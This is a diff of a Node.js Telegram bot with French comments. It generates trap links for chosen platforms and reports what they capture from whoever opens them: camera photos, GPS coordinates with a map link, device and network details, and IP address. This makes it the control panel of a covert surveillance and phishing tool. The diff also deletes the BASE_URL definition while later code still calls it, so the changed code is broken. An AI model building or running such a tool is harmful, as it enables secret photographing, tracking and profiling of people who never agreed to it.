@@ -1,25 +1,11 @@
-const TelegramBot = require("node-telegram-bot-api");
-const axios = require("axios");
-const dotenv = require("dotenv");
+const TelegramBot = require('node-telegram-bot-api');
+const express = require('express');
+const bodyParser = require('body-parser');
+const dotenv = require('dotenv');
+const axios = require('axios');
 
-// Configuration propre
 dotenv.config();
 
-// Réduire les logs verbeux TLS
-process.env.NTBA_FIX_319 = 1;
-process.env.NTBA_FIX_350 = 1;
-
-// Filtrer les logs encombrants
-const originalLog = console.log;
-console.log = (...args) => {
-    const message = args.join(' ');
-    if (message.includes('TLSWrap') || message.includes('Symbol(') || message.includes('kBuffer')) {
-        return; // Ignorer les logs TLS verbeux
-    }
-    originalLog.apply(console, args);
-};
-
-// Initialisation du bot
 const token = process.env.TELEGRAM_BOT_TOKEN;
 if (!token) {
     console.error('❌ TELEGRAM_BOT_TOKEN manquant dans les Secrets !');
@@ -28,15 +14,9 @@ if (!token) {
 
 const bot = new TelegramBot(token, { polling: true });
 
-// URL de base simplifiée
-const BASE_URL = process.env.REPLIT_DOMAINS
-    ? `https://${process.env.REPLIT_DOMAINS.split(",")[0]}`
-    : `http://localhost:${process.env.PORT || 5000}`;
+const app = express();
+app.use(bodyParser.json());
 
-console.log(`🤖 Bot Telegram démarré !`);
-console.log(`📡 URL de base: ${BASE_URL}`);
-
-// 🎯 COMMANDE /start
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const welcome = `🔥 **Bot de Capture de Données Activé !**
@@ -51,7 +31,6 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, welcome, { parse_mode: "Markdown" });
 });
 
-// 🎯 COMMANDE /help
 bot.onText(/\/help/, (msg) => {
     const chatId = msg.chat.id;
     const help = `📚 **Guide d'utilisation :**
@@ -74,7 +53,6 @@ bot.onText(/\/help/, (msg) => {
     bot.sendMessage(chatId, help, { parse_mode: "Markdown" });
 });
 
-// 🎯 GÉNÉRATION DE LIENS
 bot.onText(/\/generate/, (msg) => {
     const chatId = msg.chat.id;
 
@@ -96,19 +74,15 @@ bot.onText(/\/generate/, (msg) => {
     bot.sendMessage(chatId, "🎯 **Choisis ta plateforme :**", keyboard);
 });
 
-// 🎯 GESTION DES BOUTONS (CALLBACK QUERIES)
 bot.on("callback_query", async (query) => {
     const chatId = query.message.chat.id;
     const platform = query.data;
 
-    // Répondre immédiatement au callback pour éviter les timeouts
     bot.answerCallbackQuery(query.id).catch(() => {}); // Ignorer les erreurs silencieusement
 
     try {
-        // Générer le lien
         const response = await axios.post(`${BASE_URL}/generate-link`, {
-            platform,
-            chatId
+            platform
         });
 
         const { id, url } = response.data;
@@ -145,7 +119,6 @@ bot.on("callback_query", async (query) => {
     }
 });
 
-// 🎯 COMMANDE /data [ID]
 bot.onText(/\/data (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const linkId = match[1].trim();
@@ -154,10 +127,8 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
         const response = await axios.get(`${BASE_URL}/get-data/${linkId}`);
         const data = response.data;
 
-        // Construire le message de résultats
         let message = `📊 **DONNÉES CAPTURÉES - ${linkId}**\n\n`;
 
-        // 📸 Photos
         if (data.images && data.images.length > 0) {
             message += `📸 **Photos :** ${data.images.length} images capturées\n`;
             message += `📐 **Résolution :** Haute qualité (jusqu'à 1920x1080)\n\n`;
@@ -165,7 +136,6 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
             message += `📸 **Photos :** Aucune image capturée\n\n`;
         }
 
-        // 📍 Localisation
         if (data.location && data.location.latitude) {
             message += `📍 **Géolocalisation :**\n`;
             message += `• Lat: ${data.location.latitude}\n`;
@@ -182,7 +152,6 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
             message += `📍 **Géolocalisation :** Non disponible\n\n`;
         }
 
-        // 📱 Appareil
         if (data.device) {
             message += `📱 **Appareil :**\n`;
             if (data.device.platform) {
@@ -197,7 +166,6 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
             message += '\n';
         }
 
-        // 🌐 Réseau
         if (data.network && data.network.effectiveType) {
             message += `🌐 **Réseau :**\n`;
             message += `• Type: ${data.network.effectiveType}\n`;
@@ -207,14 +175,11 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
             message += '\n';
         }
 
-        // ⏰ Timestamp
         message += `⏰ **Capturé le :** ${new Date(data.timestamp).toLocaleString('fr-FR')}\n`;
         message += `🌐 **IP :** ${data.ip || 'N/A'}`;
 
-        // Envoyer le message principal
         bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
 
-        // Envoyer la première photo si disponible
         if (data.images && data.images.length > 0) {
             try {
                 const imageBuffer = Buffer.from(data.images[0], 'base64');
@@ -235,7 +200,6 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
             }
         }
 
-        // Lien Google Maps si géolocalisation disponible
         if (data.location && data.location.latitude) {
             const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
             bot.sendMessage(chatId,
@@ -263,7 +227,6 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
     }
 });
 
-// 🎯 GESTION DES ERREURS GLOBALES
 bot.on('polling_error', (error) => {
     console.error('❌ Erreur polling:', error.message);
 });
@@ -272,5 +235,4 @@ bot.on('webhook_error', (error) => {
     console.error('❌ Erreur webhook:', error.message);
 });
 
-// Message de confirmation
 console.log('✅ Bot Telegram prêt et en écoute !');
